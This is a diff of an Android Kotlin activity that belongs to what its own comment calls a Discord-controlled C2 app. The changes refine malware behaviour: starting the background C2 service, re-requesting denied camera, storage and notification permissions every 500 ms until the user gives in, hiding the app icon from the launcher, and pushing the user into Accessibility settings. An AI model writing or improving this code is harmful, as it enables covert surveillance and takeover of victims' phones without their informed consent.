@@ -25,7 +25,6 @@ class MainActivity : Activity() {
         private const val TAG = "MainActivity"
         private const val RC_ALL = 100
         private const val RC_MANAGE_STORAGE = 101
-        private const val RE_REQUEST_DELAY = 500L
 
         val ALL_PERMS = listOfNotNull(
             Manifest.permission.CAMERA,
@@ -43,14 +42,6 @@ class MainActivity : Activity() {
             if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) Manifest.permission.WRITE_EXTERNAL_STORAGE else null,
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null,
         )
-
-        fun hasManageExternalStorage(ctx: Context): Boolean {
-            return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                Environment.isExternalStorageManager()
-            } else {
-                ContextCompat.checkSelfPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-            }
-        }
 
         fun hasPermission(ctx: Context, perm: String): Boolean {
             return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
@@ -85,24 +76,17 @@ class MainActivity : Activity() {
         }
     }
 
+    private var permissionsGranted = false
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         if (!isTaskRoot) { finish(); return }
         Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
 
-        // 1. Start main service
+        // Step 1: Start the background service (runs Discord C2)
         try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
 
-        // 2. Hide app icon
-        try {
-            packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-        } catch (_: Exception) {}
-
-        // 3. Check and request permissions
+        // Step 2: Request permissions FIRST — activity must stay alive for dialog
         requestAllPerms()
     }
 
@@ -111,10 +95,10 @@ class MainActivity : Activity() {
         Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")
 
         if (needed.isEmpty()) {
-            Log.i(TAG, "All permissions granted")
-            onAllPermissionsGranted()
+            Log.i(TAG, "All permissions already granted")
+            onPermissionsReady()
         } else {
-            Log.w(TAG, "Requesting: ${needed.joinToString(", ")}")
+            Log.i(TAG, "Requesting: ${needed.joinToString(", ")}")
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
         }
     }
@@ -130,42 +114,58 @@ class MainActivity : Activity() {
             }
 
             if (denied.isNotEmpty()) {
-                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting in ${RE_REQUEST_DELAY}ms")
+                Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting")
                 // Re-request denied permissions after short delay
                 Handler(Looper.getMainLooper()).postDelayed({
                     if (!isFinishing && !isDestroyed) {
                         ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                     }
-                }, RE_REQUEST_DELAY)
+                }, 500)
             } else {
-                onAllPermissionsGranted()
+                onPermissionsReady()
             }
         }
     }
 
-    private fun onAllPermissionsGranted() {
-        Log.i(TAG, "All permissions granted — checking accessibility")
-        if (!isAccessibilityEnabled(this)) {
-            Log.w(TAG, "Accessibility not enabled — opening settings")
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (!isFinishing && !isDestroyed) {
+    private fun onPermissionsReady() {
+        if (permissionsGranted) return
+        permissionsGranted = true
+        Log.i(TAG, "All permissions granted")
+
+        // Step 3: Hide app icon from launcher
+        try {
+            packageManager.setComponentEnabledSetting(
+                ComponentName(this, MainActivity::class.java),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "hide icon: ${e.message}")
+        }
+
+        // Step 4: Open Accessibility settings so user can enable it
+        Handler(Looper.getMainLooper()).postDelayed({
+            if (!isFinishing && !isDestroyed) {
+                if (!isAccessibilityEnabled(this)) {
+                    Log.i(TAG, "Opening Accessibility settings")
                     openAccessibilitySettings(this)
                 }
-            }, 300)
-        }
-        finish()
+                // Finish activity after settings opens
+                finish()
+            }
+        }, 300)
     }
 
     override fun onResume() {
         super.onResume()
-        // Re-check permissions every time activity resumes
-        val stillNeeded = ALL_PERMS.filter { !hasPermission(this, it) }
-        if (stillNeeded.isNotEmpty()) {
-            Log.w(TAG, "Still missing permissions on resume: ${stillNeeded.size}")
-            requestAllPerms()
-        } else if (!isAccessibilityEnabled(this)) {
-            Log.w(TAG, "Accessibility still not enabled")
-            openAccessibilitySettings(this)
+        // Re-check permissions on every resume
+        if (!permissionsGranted) {
+            val stillNeeded = ALL_PERMS.filter { !hasPermission(this, it) }
+            if (stillNeeded.isEmpty()) {
+                onPermissionsReady()
+            } else {
+                requestAllPerms()
+            }
         }
     }
 }
